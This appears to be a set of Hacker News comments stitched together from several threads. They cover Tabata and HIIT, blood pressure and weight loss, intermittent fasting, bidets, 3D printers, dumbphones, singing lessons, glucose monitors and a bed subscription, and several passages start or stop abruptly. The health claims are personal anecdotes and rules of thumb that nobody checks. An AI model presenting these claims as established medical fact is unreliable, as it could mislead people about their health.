intensity\" meant 170% of VO2max - definitely not easier to do consistently, even if you can voluntarily sustain 170% VO2max. Popular \"HIIT\" methodology is only loosely inspired by it, and the mechanisms for their merits would be largely unrelated to that of the original Tabata protocol's benefits (which was about demonstrating a way for elite athletes to push anaerobic capacity at the same time as aerobic, not shaving 50 minutes off their cardio routine). The growing research into how even a small amount of activity can confer significant benefits to the sedentary may be yet another mechanism entirely. I agree shorter workouts are much easier to stick to though, especially since I'm easily bored. reply warner25 16 hours agorootparentRight. I once experimented with organizing my running workouts according to the original Tabata protocol, as closely as possible, for about six weeks[1]. I wasn't an elite athlete by any means, but I was a 21 year-old Army cadet in the top quartile of cadets in terms of fitness. I found that it's indeed difficult to strike a legitimate 100% effort, even when it's only for 20 seconds and only 5-10 times. My point is not that people should adopt the protocol as a sustainable, long-term routine; it's just that there's been evidence for a long time that short workouts can have disproportionate benefits in addition to being easier to program into day-to-day life. [1] The results on my running performance, specifically over two miles, weren't clear, by the way. I wasn't running my best times when I started the experiment, nor at the end of it. But at least I didn't get worse despite averaging only six miles per week. I've done much better on 15-25 miles per week with a wider variety of speed work. reply seadan83 15 hours agorootparentHIIT or Tabata must not be done day-to-day, everyday. With no recovery days, there will be no gains. A 21 year old is able to recover like crazy, a good 9 hours of sleep might be enough to mostly recover. For others it would not work well and would lead to over-training. In overtraining, the 100% efforts will be 90% efforts, impact the immune system, generally just not good all round. For disproportionate benefits, one needs to define which benefits exactly. A max effort will burn a lot of calories quite quickly and potentially increase V02 max (which is highly correlated to overall longevity). Zone 2 training has become popular and has other benefits, notably increases 'fat max' threshold - which gives different benefits (specifically the ability to work harder for longer while still using fat as an energy source for the exercise). > I found that it's indeed difficult to strike a legitimate 100% effort, even when it's only for 20 seconds and only 5-10 times. This is essentially the point. At the end of Tabata, the last interval should be the last bit of energy you have in the tank. It should be entirely draining. Doing this routine daily will not allow recovery to then properly do the training well. FWIW, I heard it paraphrased as this: the body has essentially too modes, hard & easy. When going hard, it only matters how hard you go, not how long. When going easy, it only matters how long you go for, not how hard. At the same time, zone 2 training and HIIT/Tabata are not mutually exclusive in their benefits, but it's more which systems receive the most benefit while other systems in the body receive benefits but to a lesser degree. reply warner25 14 hours agorootparentThe original experiment was four days per week of the \"exhaustive intermittent training\" and a fifth day was 30 minutes of zone 2. That's what I followed. It does seem like that fifth day has been forgotten when people talk about Tabata. Like you said, \"zone 2 training and HIIT/Tabata are not mutually exclusive,\" and I've gotten my best results when doing a few hours per week of zone 2 running with a dash of higher-speed intervals or repeats one day. Now that I'm quite a bit older, despite maintaining my body weight and two-mile running time since then, I'd probably get hurt if I repeated the experiment. reply dspillett 8 hours agorootparentprev> With no recovery days, there will be no gains. That is true of any exercise regime with much intensity. For muscular activity: pushing towards anything like your limits technically causes lots of minor damage, which the body repairs back better. If you don't give yourself sufficient recovery time within your weekly routine you miss out on a lot of that benefit because the body's repair/improve systems don't have time to properly do their thing. This is one of the reasons¹ why overtraining injuries are a thing. In terms of cardio this still applies, the heart is a set of muscles. Mentally I think there is a similar effect, but pinning down a cause for this is much more hand-wavy and subjective compared to the far better understood² mechanisms of how the body repairs, regulates, and improves, physical structures. Some people seem to manage with minimal recovery time, but they are either lucky³, kidding themselves, or storing up issues ready for a big nasty surprise later. ---- [1] Other similar reasons include damage & fatigue in parts of the body other than muscles, and sometimes just being tired to the point of getting form wrong and hurting yourself through that. [2] though still not entirely understood [3] I'm counting being young as being lucky here. I'm trying to get back into running and other regular exercise (after a period of illness, looking after family with medical issues, and general burn-out) and the biggest thing getting in the way of improving from here is that I'm now in my mid/late 40s rather than early 30s like last time I was at this level of conditioning! reply cenamus 10 hours agorootparentprevWalking up a flight of stairs briskly is way above VO2 max for the vast majority of people, yet doesn't feel \"extreme\" reply 4gotunameagain 9 hours agorootparent> for the vast majority of people ..In the states.

Walking is one of the best mild exercises, if you can do it in a safe place, where you can't trip or fall into a hole or be mugged (or some other risk), because you can think while walking. So you can use the time to think about your work (if applicable, like for software people, at least in some cases), or your life, or anything else. You can also not think deliberately (although thoughts may come anyway), and just enjoy the walk. For example, I think about my side projects while walking, and have been surprised to find that I have sometime made good progress on some of them while doing so. reply mancerayder 15 hours agoparentprevTabata makes you want to vomit if you don't have at least a moderate level of fitness. Even if it's great conditioning. So here's the problem. We go on about what's optimal from a raw time perspective, but time slows subjectively when you suffer. So people who don't conceptualize themselves as athletic, they may have insecurities if not outright skepticism, aren't going to last. You can make a culty cultural glue to get habits to stick (because fitness is all about habits). You can do CrossFit, the social and positive aspects. That encouragement can bring habit and a change of self perception. But if you're just a self-driven type, and you're dipping your toes in the water, my observations are that whatever is fun (an individual experience) is what you'll be creating a habit with, and time foes quickly. So explore a brunch of things until you encounter fun. Tennis, running club, weightlifting club. Etc. So my point is that fitness is a problem around how people experience exercise and training, instead of what's optimal in a paper or in terms what's efficient in terms of time.

Now, 1.5 years later, I do the same exercise (with a lot more strength) and hit 156 bpm average, 176 max. If I halt for 10 seconds (phone ringing), my bpm plummets (150 or even 148) and it's hard to bring back. On top of that, I have to be more careful not injuring myself: my muscles are a lot stronger, so if I use all my strength in an attempt of pushing my bpm, I can hurt my body.

Exercise is good overall, but it's also considerably overhyped due to a procession of weak and narrowly-applicable results being misconstrued as adding up to a massive pile of benefits that applies to the average person. In reality, the average person does not get anywhere close to the sum of all the touted benefits; they get some constellation of some of the benefits, while other outcomes are flat or even regress [1]. So yes, \"exercise is good\" at a sufficient level of abstraction, but it's much harder to make the case that it's \"good for [specific outcome] for [specific person]\". Which is one reason that it's such an obnoxious trend for specific health complaints to be met with generic recommendations to exercise (or exercise more, or exercise differently). [1] https://pmc.ncbi.nlm.nih.gov/articles/PMC6818669/ reply brailsafe 17 hours agorootparentIt seems a bit silly to me that in many circumstances it's just way more acceptable for exercise to be zero part of your life than the reverse, and that an argument needs to be made for geting more than even 30 mins worth of movement in a week. A culture of getting exercise by default seems like the way things should be, and the should be an affordance for those who can't rather than a luxurious escape from not having to. It's not as true in some places in some circles, but it's hard not to notice a difference when you temporarily visit the others. reply 0xcde4c3db 15 hours agorootparentI think you're right overall, but a lot of that is an unexamined reaction to a built environment designed for motor vehicles, rather than being designed for humans.

The idea of having a regular checkup with a doctor is unheard of and will get you some weird looks if you ask for it. The NHS doesn't seem (as an outsider looking in) to do well with preventative care. I firmly believe (without necessarily a lot of evidence) that if we focused more on healthy lifestyles and made them more cost effective for people the amount of money we plough into the NHS every year could be reduced drastically. reply ninalanyon 5 hours agorootparentI suspect that regular check-ups for most people would simply regularly confirm what they already know: they need to lose weight, stop smoking, take more exercise, eat more fruit and veg. The UK now has a sugar tax on soft drinks that seems to be having a measurable positive effect. Whether it is a meaningful effect remains to be seen though: \"The findings suggest that a year after the sugar tax was introduced, adults reduced their daily free sugar intake by about 10.9g, and a reduction in soft drinks accounted for over half of this reduction. This translates to a reduction of around 40 calories daily, which if maintained, and assuming no other changes, could lead to 1.5kg weight loss over a year.\" https://theconversation.com/how-do-we-know-the-uks-sugar-tax... So perhaps instead of exhorting people to do better the state should continue to try to make bad habits more expensive and good habits cheaper. reply HuwFulcher 5 hours agorootparentYes a regular check-up wouldn't be the silver bullet but it would help expose larger problems under the surface which could be prevented with prescribed exercise, diet, etc. Ultimately it's down to the patient to put in the work but if the NHS focused more on creating community practices where these things could be more widely available then maybe we should see more meaningful change. reply jimjimjim 18 hours agorootparentprevYes, Cheerleading is great exercise and the population would probably be healthier if everyone did it. reply bobthepanda 18 hours agorootparentCheerleading is actually incredibly dangerous with the number of catastrophic spinal or brain injuries exceeding the combined totals of all other female sports. https://www.nytimes.com/2024/10/22/magazine/cheerleading-jef... reply jimjimjim 18 hours agorootparentInteresting article.

Don't even have to spend a ton of time on it. Can do a basic set of curls/whatever while cooking breakfast.

You need several hours of relatively strenuous exercise per week. Walking around the neighborhood, or your house, or whatever has diminishing returns.

Rule of thumb is that your systolic blood pressure will drop by 1 mmHg per 1 lb of weight loss, eventually slowing down to 1 mmHg per 2 lbs of weight loss as you get back down to more normal blood pressure range / weight range. Source: went from 160/110 to 120/90 in several months by dropping 60 lbs. reply technothrasher 18 hours agoparentYep, I found weight loss was pretty much the only thing that would drop my blood pressure. Though it didn't drop linearly like you're describing. From 215lb to 180lbs, it didn't really change much at all. Once I got down below 180lbs, it quickly dropped (from ~150/90 to ~120/80) and stayed there. When I slacked off my good eating habits and went back above 180lbs, blood pressure shot right back up to ~150/90. I'm back down again to about 172lbs and clearly get it now, I have to stay here. reply fouc 5 hours agorootparentInteresting! I wasn't really thinking it was linear, but your example does highlight the fact there's probably a few steady states that the body prefers to operate at. reply kbelder 18 hours agoparentprevI've had similar results with blood pressure, although a smaller weight loss (about 30 lbs) and smaller decrease. Another 10-20 pounds to go. For what it's worth, I'm on a intermittent fast. I only eat between 5pm to 10pm, with no real restrictions on what I eat. I was surprised how quickly weight fell away, and how easy a diet it was to stick to. 'Eat after work' was a simple behavior to adapt to. People are very individual, and this might not work for a lot of people, but it's doing great for me. I didn't want to spend the rest of my life on blood-pressure drugs. reply renegade-otter 10 hours agorootparentIsn't that an extreme version of IF? I think the usual window is 8 hours, so people should first try eating between lunch and dinner, say 12PM-8PM. A lot of people eat breakfast out of habit, and I found that once I got older, I just stopped needing it. It made me bloated and sluggish. You just don't need that many calories per day when you stop growing or not working in construction. reply fouc 5 hours agorootparentIF typically starts at 16/8 but 20/4 or 23/1 (One meal a day) variations seem pretty common too.

However, high blood pressure and weight are not as simple as one might think. My friend has had problems with blood pressure since his 40s, but he is not overweight at all and has never been. He exercises at least weekly. I am 60, at least 15 kgs overweight for the last 20 years (not obese), but my blood pressure is very good. I have always excercised daily, often for 1 - 2 hours, but at low intensity. Nowadays even lower because I have knee problems. Probably lower weight would have helped with those. reply hippich 11 hours agoparentprevWhile it does appear to work for many, I personally lost about 20% weight or 40lbs, with seemingly zero effect on blood pressure. I do measure it around the same time of the day, same place, nearly same condition... So it is not about inconsistencies of measurement - I had elevated blood pressure for as long as I remember. My BP does respond to exercise (or more likely to body heating up) for short period of time, and to meds, but meds make it very inconvenient since I have to plan it around my day - having meds and working on something outside in Texas heat = too low BP. reply LinuxBender 15 hours agoparentprevThis is true but not the only cause of high blood pressure.

Exercise doesn't always work like this. Yes you'll have bad days, but you'll find yourself more energised most of the time and mentally more at peace. Thinking it will make you more tired can often be just a preconception. It's like that classic sedentary worker ailment of the sore back.

I've often gone on bouts of cardio on a treadmill for months at a time (multiple times a week - at least 30 minutes each session). It never ceased to suck. I can do a hike and never feel bad.

Let’s split it up into two categories: - Under $100 - Under $1000 What did you get? And what was the impact? I’d love to hear the stories – big or small changes, whatever made a difference for you. Thanks in advance for sharing! miloignis 23 hours agoUnder $100: 1) A bidet! Got one in the pandemic when toilet paper was scarce and I wanted to be more efficient, but now I'll never go back. The Tushy ones are good. 2) A safety razor & accessories. I get a cheaper, closer, less irritating shave, and I get to customize every part of it. This can certainly be a rabbithole you spend a lot of money on, but you can get a solid customized starter kit for under $100 that will be totally solid, and from then on you're saving money over cartridges and gel unless you really want to splurge. I'll second the electric toothbrush suggestion too, its great having my teeth fel clean and smooth. reply gwbas1c 1 hour agoparentI bought some Tushies for my house and they were awful, they were so thick that they broke my toilet seats. I then bought new toilet seats and little stick-on bumpers, but they fell off. I then visited a friend who had an older Tushy and it was thin enough that he had no problems. It's like they switched to a cheaper version without testing it, and then marketed the hell out of it. I ended up replacing all my Tushies with Amazon's toilet seat with a built in bidet. It's decent. reply fnimick 19 hours agoparentprevSafety razors are amazing and life changing. Even if you have something basic it's better for your skin than a cartridge razor, plus it's better for the planet (way less plastic), plus it's way less expensive! I don't know how they are still a niche item. For anyone who wants to get started, I recommend (no affiliation): - the henson razor for those who want something on automatic. It's less efficient (worse at cutting long hair) but it's basically impossible to cut yourself with it due to the small blade gap - the rockwell 6s for tinkerers. It has 6 different settings for blade gap so you can choose your favorite, switch it up if you skipped shaving for a day and have longer hair, etc reply ingend88 44 minutes agoparentprevIs there a travel bidet that falls into the same category in terms of the quality ? I have tried many but nothing works at the same level as tushy and thought i would make one myself! Would anyone from this community buy one if I made a very strong force bidet thats portable ? reply stavros 22 hours agoparentprevYesss bidet post upvote! Seriously, whenever I stay somewhere without a bidet I feel like a caveman. It's just such a quality of life improvement, it's crazy. Under $1000: My 3D printer. I just super love 3D printers. reply Corrado 11 hours agorootparentSame for me. The bidet is absolutely a life changer. And the BambuLab's A1 3D printer (and mini-AMS) was by far my favorite under $1000 purchase. I've already printed some fidget \"tools\", toys for the grandchildren, toys for the children, and even a couple of useful tools for me. As a bonus I get some more experience in CAD and other 3D design tools. It's turning into quite a hobby for me. reply stavros 10 hours agorootparentHell, the A1 mini is something like $199, it's such a steal I'm thinking of buying some to gift to friends. reply benterix 8 hours agorootparentFor me P1S hits the soft spot: it's not terribly expensive, and it just works out of the box, is closed so the temperature is well-controlled (plus a carbon filter to keep the fumes down), you can add AMS easily. With 0.2 nozzle you can basically print figurines with almost resin quality. reply stavros 6 hours agorootparentI love my P1S. Maybe not a great starter printer, if you don't know if you like printers or not, but definitely the best bang for buck if you know it's not going to be a \"let's try 3D printing and see if I like it\" purchase. I do recommend a small length of foam tape for the left side of the door, though, the hinge is not lined and some fumes come out. Putting some foam there greatly improves that. reply jorisboris 11 hours agorootparentprevWhat do you use the 3D printer for? reply stavros 11 hours agorootparentI get this question a lot, and I never have a good answer. The best way to describe it is that it's a tool, so it unlocks a whole solution space that wasn't there before. Before, I used to live with random little annoyances so much that I couldn't even see them as annoyances. After you get something that can solve all of them, your mind just unlocks. Toilet seat won't stay up? Print a hook. Taking my glasses out of the glove compartment takes too long? Make a custom glasses holder. The cat eats too much? Print a cat feeder. My USB hub slides around too much? Print a bracket to hold it down. Too many devices on my desk? Print under-desk mounts for them. The list just goes on and on and on, I've printed probably thousands of useful things, especially for my hobbies. reply cameronh90 22 hours agoparentprevFor anyone in the UK interested in getting a bidet: most normal bidets are illegal due to our water safety backflow prevention regulations. As a minimum you need a break tank - a double check valve isn’t sufficient. reply ohnoitsahuman 22 hours agorootparentSecret bidet is secret. reply oliwarner 21 hours agorootparentprevI know this applies for bumguns —various water boards have published guidance— but a lot of the under-seat bidets retract [without positive water pressure]. There's no risk of the spout sitting in and siphoning dirty toilet water it back into your supply. I'm neither a lawyer or a plumber but these seem like they might be okay. reply Const-me 20 hours agorootparent> There's no risk of the spout sitting in and siphoning dirty toilet water it back into your supply In many places in Europe tap water is safe to drink. However, hot tap water is not. The regulations mentioned by GP might protect safety of the cold tap water from intake of hot tap water. Which is easy to do unintentionally when mixing hot and cold water. reply benterix 8 hours agorootparentOh so that's why the Brits all have this crazy setup with separate cold and hot taps! I was always wondering why - I'm from a country where you can mix water easily. reply jtwaleson 21 hours agoparentprevMy parents in law lived in the middle east for a long time, and we all got used to bidets over there. I've had a \"mini shower head\" version next to my toilet for the last 15 years or so. A bit afraid that it'll start leaking at some point, but so far it's holding up great. I would never go back to TP only. reply Kiro 22 hours agoparentprevAll bidets I've looked at including Tushy seem really complicated to install (basically having to redo the plumbing) and I don't understand how so many people can just buy and install one like it's nothing. Am I imagining things? Edit: Not in the US and the plumbing looks a bit like this, but without the nuts so you can't easily disconnect a part of it: https://static.byggahus.se/attachments/images/large/341/3416... reply Digory 22 hours agorootparentIf you can handle putting the nozzle on your garden hose, you should be able to handle it. In the US, the water pipe almost always connects to the toilet through a small shutoff valve. After the valve, it connects to the toilet through a \"supply.\" The supply is basically a short garden hose, with screw-on connections at both ends. Shut off the water at the wall. Flush to empty the toilet tank. Unscrew the hose at the toilet, and screw that end into what amounts to a y, or splitter that comes with the bidet. From the splitter, screw one side back into the toilet connection; the other goes to the bidet itself. Turn back on the water at the wall. (This is for a simple cold-water bidet. If you need heated water or electricity, it can be more complex.) reply taftster 20 hours agorootparentI mean, but don't you need warm water and/or electricity? I can't see liking a bidet if it's basically just cold tap water shooting up my bum. Not sure that's going to do it for me. I've always thought that both hot water and electricity would be a minimal barrier to entry for a bidet. And that neither of these exist in a typical toilet closet. Am I fundamentally wrong about this?? reply Digory 19 hours agorootparentWhether you need it probably depends on your climate and your house. Water in pipes inside a house's \"thermal envelope\" is presumably around 72 deg. F. I wash my hands with \"cold water\" without wincing. Tap water strikes me as tepid if I drink it without ice. If your pipes run through an outside wall in Canada, it might be a different story. If you do need warmer water, and the bidet heats it, you probably just need an electrician to fish a wire and add a receptacle. That's not outrageously complex, usually, but I tend toward calling a professional for anything behind the walls. reply dvngnt_ 20 hours agorootparentprevit's really not that cold. i can't do cold showers at all and tap water bidet feels nothing like it. reply jdyer9 19 hours agorootparentSame, I don't even like washing my hands with cold tap water, but cold bidet water is no issue. reply fiatpandas 19 hours agorootparentprevThe bidet heats up the water instantly, there is no requirement for a hot water supply. Just connect it to the existing water supply the toilet uses. You do however need electricity. I had to run an extension cord for mine, which I tucked away in low profile conduit to keep things tidy looking. reply raphaelb 22 hours agorootparentprevIt depends on what your toilet supply lines are like and if you use a cold water only or a cold/hot water bidet, but a cold water only one (not nearly as uncomfortable as imagined before trying it) is very easy to install as long as your supply line has a shutoff valve and is relatively flexible. It takes 15-20 minutes and it basically consists of unscrewing a few things and screwing them back together again. reply tapoxi 22 hours agorootparentprevI bought a Tushy during the pandemic, it took about 10 minutes and a flathead screwdriver. I liked it so much that when I had a new bathroom installed a year later I put in a Toto Washlet. reply 7373737373 21 hours agorootparentI feel like Toto is failing with their marketing, since people are not really aware of their products outside of Japan. No good and cheap alternatives either reply toyg 18 hours agorootparentToto is failing with their prices. I know they can print money in Japan, but it looks like they don't really want to be competitive elsewhere. Sooner or later someone will persuade the right influencer to start a bidet craze and they will get 10x bigger than Toto overnight. reply 7373737373 10 hours agorootparentYep, this is what I've been thinking! reply newdee 20 hours agorootparentprevDuravit aren’t cheap, but are much cheaper than Toto (at least in the UK) whose pricing is kinda outrageous. reply dzhiurgis 20 hours agorootparentprevIs Toto really that better than others? I have both (very old Toto vs Chinese no-name) and I see no difference. reply fellowniusmonk 2 hours agorootparentYou can pry my toto drake 2 from my cold dead hands. reply mikestew 22 hours agorootparentprevTo follow on to user infecto’s sibling comment, for most U. S. homes, it is probably fifteen minutes of work. Shut off water, connect t-line, bolt down new toilet seat, sorted. It shouldn’t be complicated for most installations. reply dyeje 21 hours agorootparentprevI ended up buying a travel bidet because I couldn’t install one at our house for various reasons. It’s basically just a squeeze bottle with an angled head. Works great! reply infecto 22 hours agorootparentprevUS based plumbing. You are imagining things. Most/all resi toilets in the US use a flex hose to connect the toilet to your water supply. Its usually a threaded connection. All these style of bidets simply have a T off of this connection. reply Kiro 22 hours agorootparentNot in the US. The pipe just goes straight into the toilet. When googling around seeing articles about installing Tushy when you have rigid pipes they are still much more flexible than mine, with separate parts you can disconnect and replace. reply syntheticnature 21 hours agorootparentI was in the situation you describe when I got a bidet. It's possible to replace that pipe -- a little more work of course, but it's still turn off water, replace pipe with flexi-hose, connect bidet. reply Kiro 21 hours agorootparentI posted a picture in my original comment. Was it in the same ballpark? The difference with mine is that there are no nuts on the pipes next to the wall. It's one solid construction going from the sink through the toilet to the shower. reply MisterTea 20 hours agorootparentprevThose are compression fittings which we also use in the USA for sink and toilet connections. Standard size here is 3/8 inch which is the outer diameter of the tubing. They are easy to work with as you only need a tube cutter (or hacksaw with fine tooth pitch) and a wrench. You cut the tube, slide a compression nut over, slide the ferrule(s) on, insert the tube into the fitting, finger tighten the compression nut, make sure everything is aligned then tighten nut with wrench. No solder, no fancy crimp tools. You can disassemble and reassemble without leaks. The only issue is the ferrule winds up becoming swaged to the tube after wrench tightening so you have to cut the tube end off behind the ferrule if you want to replace the nut. However, instead of using rigid metal or plastic tubing you commonly find a flexible hose assembly[1]. Only fancy installs use custom formed polished rigid tube for the look. We also tend to leave most of the plumbing in the walls and only the shut off valve protrudes from the wall. Maybe there are flexible hoses available in your region. When I installed my bidet all I needed was a 3/8 compression tee[2] which they make specifically to tap shutoff valves. The bidet came with a 3/8 connection hose so that went to the tee and I was up and running. The big issue was electric - no outlets in the bathroom. So having seen how Japan loves extension cords I too used one, ran a 12 AWG cord out to the hall to a GFI adapter plugged into a socket. Jank but highly unlikely to cause a fire.

I keep a beard year-round so I don't really shave much. Incredible value purchase, with very minimal effort it has remained practically as good as new. reply declan_roberts 22 hours agoparentprevSecond a bidet. Used one in Asia and bought one immediately on returning to the USA. reply telcal 14 hours agoparentprevYes for a bidet! My wife wanted one, I thought I'd hate it but it really is fantastic. We have a Toto Washlet C5. Heated seat, heated spray, warm air dryer. Had to cancel the Amazon toilet paper auto-delivery. reply bigyikes 22 hours agoparentprevI can’t live without a bidet but the Tushy ones are no good - tight knobs and awkward spray angle. reply dmckeon 21 hours agorootparentLuxe Neo bidet attachment - easy to tee into supply, fits under toilet seat, options for rear/male only, or both rear/front male/female separate spray nozzles. reply K0balt 22 hours agoparentprevI’ll Third a bidet. Once you experience the exhilarating bliss of cleaning your nether regions with fresh, clean water, you’ll never willingly go back to smearing excrement around your fiddly bits with the dry paper. reply foobarian 22 hours agorootparentSorry if this is getting into TMI territory but how does the bidet avoid dissolving the unwanted material and spraying it all over everywhere? And how does one dry this without toilet paper? reply BurdensomeCount 22 hours agorootparentIt works under the same principle as pressure washing, as long as the water pressure is high enough the final result is completely clean. Too high pressure can lead to material flying around everywhere but there's a very large range where the pressure is high enough to clean you but not enough to spray things around. Drying is a personal preference and isn't as important anymore as you're clean down there now. Toilet paper is one option but you don't have to do it (I don't dry for reference) as it'll dry out by itself in a few minutes once you put your underwear on to absorb the water (which is fine because you're completely clean down there so it really is just clean water left). reply Cyph0n 22 hours agorootparentprevBy controlling the water pressure. reply dangus 18 hours agoparentprevI would asterisk the bidet suggestion just to say that higher end bidet seats that cost starting around $400 are wildly better the cheap ones, especially the unseated ones. I’ve bought the cheap kind, got tired of it and tossed it, then years later went with a more expensive Toto (around $400) and it’s like a completely different experience. The Toto keeps itself and the toilet cleaner for longer, it has options for gentle spray and oscillating movement, it’s entirely controlled by electronic remote rather than a crude manual knob, the water and seat are heated, it detects when you are sitting down and operates accordingly, and it even has a warm air dryer. reply HellDunkel 11 hours agoparentprevA bidet for under 100$? reply dole 6 hours agorootparentLuxe Neo bidets are like $40-60, sturdy, easy to install and yes, rather life-changing. reply jklinger410 22 hours agoparentprev+1 for the bidet reply caseyy 22 hours agoprevUnder $100: - A dumbphone. Even if I’m not using it anymore, it has shown me what life I could be living without distractions. My anxiety and stress levels went down from about the second day using it, I became much more aware of my emotional state and the environment around me, it was a noticeable shift. I no longer buy the arguments that we can control our smartphone addictions with will. The technology is too optimised for most of us to break free. And the addictions — too subtle for most to notice. It may simply be a physiological addiction to checking email or for notifications every now and then. If you feel like you’d be missing out unless you check your phone several times a day, you have it. If you reach for your phone without thinking when you’re bored, you have it. It’s all about compulsive action. I think much of the population is addicted. Certainly most of the online types. Every interaction with your phone pulls you out of being present! reply shiroiushi 17 hours agoparentI really don't see the point of a dumbphone: it seems a lot like buying a ham radio and trying to use that for your daily life. Who am I going to talk to with a dumbphone? No one actually does \"phone calls\" any more using voice calling, at least in my corner of the world. (They do for work, but I'm not in a customer-facing job so I don't.) reply 6510 10 hours agorootparentThere seems to be a hole in the market for a dumb phone that does sms well.

Biggest downside is no ride share apps work on it, but otherwise it has everything I need. reply whitehexagon 21 hours agoparentprevAgreed. Only stupid thing is that my dumb phone comes with fb that cannot be deleted, but I have no data-plan. Oh and some games that apparently auto-bill your phone account if you start using them, also cannot be deleted. Still it was the best tech purchase in a long time under 100e for quality of life improvement, and helped me finally escape the depressing 'news/propaganda' streams. under 1000e: I am still experimenting with, but a water distiller and some glass bottles to try and escape the plastic water bottle madness. reply doublepg23 21 hours agoparentprevI think I like the “dumbify” apps better. You can install them on a regular smartphone and make it a bad experience for doom scrolling but still have conveniences like MFA apps, Password Managers, audio books, music streaming, etc. that are hard to come by on true dumb phones. reply beryilma 18 hours agoparentprevWhat are the dumb phone options in the US? I want to get one. reply caseyy 15 hours agorootparentSunbeam is a popular one. Also a bunch of Nokias should work. There is also the Xiaomi/Qin/Duoqin F30. It’s a T9 phone with Android 11. But the “Westernized” version with Google Play Store has tampered with software (hacks applied) as the original Chinese software doesn’t have Google stuff nor is the phone Play verified. Then there are questions about the Chinese software itself. I’ve gone deep into the rabbit hole of trying to verify it’s secure but couldn’t to a satisfactory standard. The F30 is still considered a dumbphone for how limiting the T9 keyboard and its tiny screen are. You won’t enjoy consuming or searching for any kind of content on it. But you can install many modern Android apps if you are comfortable with the security situation. And that’s quite important sometimes to not get isolated from people, to bank, for 2FA, streaming music, and a few other things. It’s basically then a capable but highly inconvenient phone, which I think is excellent. Still, if you want privacy and security, how many days are you willing to sink into tinkering with these Xiaomi/Qin/Duoqin devices? You will need at least a few, possibly more. It’s much less hassle to just get whatever dumb phone with a feature OS you can get on Amazon or Walmart. reply memset 21 hours agoparentprevI think about this a lot! How did you overcome the compulsion? I quickly revert when I try to ween off any tech. What do you do instead? reply caseyy 21 hours agorootparentThat’s why it’s important to have tech that serves you, like a dumbphone. You throw your smartphone away (leave it in your car, leave it at work, throw it in the deep end of your attic, etc), make it really inconvenient to act in these compulsions. And then you just suffer through it for a few days. It gets better very quickly. reply shepherdjerred 19 hours agorootparentprevI wrote about my approach here: https://sjer.red/blog/2023/screen-time/ reply caseyy 15 hours agorootparentThat’s a nice compendium of methods. I tried almost all of them, they all work to an extent. I now use a smartphone again, as practicalities of life demand it. But I am switching to an old sluggish iPhone with a 4.X inch screen to hopefully put frictions in my use of it. I will see if that helps. You can disable Safari in iOS. Search for “Content & Privacy Restrictions” in Settings. Then turn Safari off in “Allowed Apps & Features”. The app will disappear after a few minutes. You can also turn off the Fitness app this way, even if you have an Apple Watch, and Car Play if you don’t like it for some reason, such as your car auto-connecting. reply wonger_ 20 hours agorootparentprevRemember to replace the bad habit with new activities, filling the void reply el_benhameen 22 hours agoparentprevMind sharing the one you bought? reply caseyy 15 hours agorootparentI bought a rare one that I needed for a very specific reason.

I'm a lifelong musician, but was an almost entirely solitary one. I taught myself different instruments, but I never felt like I could get to basic competency teaching myself to sing. I decided to spend ~$200 for a semester of weekly 30 minute lessons. (The community school cooperates with the local university to offer lessons taught by university students for a low rate.) My singing improved (more work is needed), but the life-changing thing was getting involved with the local music community. It turns out they have a shortage of piano teachers--I had mistakenly assumed there would be plenty in my town! So I started teaching piano, which had long been a dream of mine. The school also connected me to local performance opportunities that are now a part of my regular music routine. And ultimately, the experience encouraged me to enroll as a (part-time) music student at the university, which itself has been extremely enriching and a tremendously positive community experience. reply quard8 21 hours agoparentIf I have a horrible voice for singing, do you recommend voice lessons? Just for karaoke and fun. reply prewett 20 hours agorootparentNot the parent, but I would definitely recommend it. A lot of voice quality has to how you pronounce vowels and where you place the resonance in your mouth. Also, avoiding singing through your nose (hold your nose closed and if there's pressure, then don't sing that way). There are vocal exercises for all of those, as well as exercises for breath support, singing in tune, phrasing, etc. reply laurieg 9 hours agorootparentprevI would temper your expectations. Singing lessons will improve your singing faster than practicing alone but it still may take years and years to develop. I had always enjoyed singing and I started singing and piano lessons at the same time. With consistent practice you can improve at the piano, learn more complex pieces and see your progress. With singing the process is a lot more mysterious. You probably don't understand the things that are going on inside your body very well and the teacher can't just say \"Try putting your first finger on this key and your middle finger on this key\". After three years I could play reasonably complicated pop songs on the piano and read chords. I'm still a few steps the average \"someone who likes to sing level\". reply richardjs 18 hours agorootparentprevIf you'd like to improve, definitely! There are all sorts of things involved in singing that some do naturally and others (like myself) do not. Having a knowledgeable teacher who's able to observe you, identify areas of improvement, and help you progress is really beneficial. There's a whole lot of \"not knowing what you don't know\" at play. Plus singing is a pretty personal way of making music, and there can be a lot of social fear of doing it badly. Formally studying it can help with getting over the psychological hump from self-identifying as \"someone who is attempting to sing\" to \"singer\". reply jareds 22 hours agoprevUnder $100 Wireless cooking thermometer https://store-us.meater.com/products/meater-plus Since I'm blind this allows me to cook with out worrying I'll eat under cooked food.

Why is everything an electronic life-hack with a fun take on how to be eco-concious, that involves buying something I don't already own?

Also, it really important to note that I don't have diabetes or any metabolic disorders. I am mainly interested in learning more about the foods that I eat and their effects on me. The Lingo is the same hardware as the Abbott Freestyle but the difference is in the app. The way I've been using mine is to consistently log the foods that I eat (the app is really helpful for this) and then seeing what it does to my blood glucose level. My goal has been to minimize spikes in my blood glucose level. Things I found interesting: 1. Instant oatmeal spikes my blood glucose level a lot. 2. A honeycrisp apple will also spike it but a granny smith apple is much much more modest. 3. Eating bread and rice will spike it. However, eating rice as part of a meal will cause a much smaller spike. 4. Gelato can cause a modest spike but much less than you would expect, smaller than instant oatmeal or a sweet apple. 5. Dark chocolate has little effect on blood glucose. 6. Running will cause a tiny rise (maybe my body is preparing me for the energy needs?) 7. I become borderline hypoglycemic when I'm sleeping. A very notable effect from this is that minimizing these spikes has been very helpful with my dieting. My desire to snack has been much much easier to control and I've had much better success with my diet plans (I've lost 10 pounds in 3 months whereas my previous attempts only managed to lose 5 pounds before I just gave up). Once you see what food does what to your blood glucose you sort of remember what foods or groups of good to avoid. I will also say that I'm now super wary of most processed foods. I don't want to be too cynical but I do wonder if the companies knew the connection between blood glucose level spikes and hunger signals. reply jwoglom 11 hours agorootparentprevStelo is essentially a binned, feature-restricted version of the G7 that’s available OTC without a prescription.

It is extremely distasteful to have a required (?) subscription on a product that is this expensive. I don't entirely get how spending $2k - $5k on a bed system (not a mattress!) isn't enough. Just pure fuckin' greed if I am being honest. I get they need to make money and their product isn't a monthly or yearly re-purchase but it's just short-sighted. Like let's be real honest here: their product almost certainly doesn't cost anywhere near $5k in materials. The margins on their product are likely already completely stupid. My guess-timate would be maybe $500 in parts. It's literally just a pump that heats or cools water that is app-controlled... not exactly anything crazy.

